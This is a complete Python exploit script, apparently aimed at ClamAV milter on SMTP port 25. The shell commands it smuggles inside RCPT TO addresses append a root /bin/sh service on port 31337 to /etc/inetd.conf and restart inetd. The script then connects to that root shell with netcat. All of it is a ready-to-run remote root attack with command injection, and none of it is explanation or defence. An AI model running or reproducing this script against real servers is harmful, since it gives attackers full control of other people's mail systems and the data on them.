#!/usr/bin/python3
import os
import sys
import socket

if len(sys.argv[1:]) != 1:
    print("Usage: ./clamav_milter_shell.py [targethost]")
    print("Example: ./clamav_milter_shell.py 10.12.132.1")
    sys.exit(0)

target_host = sys.argv[1]
target_port = 25
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_host, target_port))
client.send(b"ehlo you\r\n"
            b"mail from: <>\r\n"
            b"rcpt to: <nobody+\"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf\"@localhost>\r\n"
            b"rcpt to: <nobody+\"|/etc/init.d/inetd restart\"@localhost>\r\n"
            b"data\r\n.\r\nquit\r\n")
os.system(f"nc -nv {target_host} 31337")
client.close()

